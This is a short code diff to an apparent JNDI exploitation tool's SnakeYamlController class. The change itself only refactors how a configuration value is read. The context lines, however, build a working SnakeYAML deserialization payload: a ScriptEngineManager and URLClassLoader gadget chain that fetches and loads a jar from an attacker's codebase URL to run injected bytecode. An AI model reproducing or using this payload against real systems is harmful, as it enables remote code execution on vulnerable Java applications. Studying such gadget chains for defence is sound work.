@@ -1,6 +1,6 @@
 package map.jndi.controller.bypass;
 
-import map.jndi.Config;
+import map.jndi.Main;
 import map.jndi.annotation.JNDIController;
 import map.jndi.annotation.JNDIMapping;
 import map.jndi.controller.BasicController;
@@ -30,7 +30,7 @@ public class SnakeYamlController extends BasicController {
         String code = JavaScriptPayload.loadClass(byteCode);
         String yaml = "!!javax.script.ScriptEngineManager [\n" +
                 "  !!java.net.URLClassLoader [[\n" +
-                "    !!java.net.URL [\"" + Config.codebase + jarName + ".jar" + "\"]\n" +
+                "    !!java.net.URL [\"" + Main.config.codebase + jarName + ".jar" + "\"]\n" +
                 "  ]]\n" +
                 "]";
 
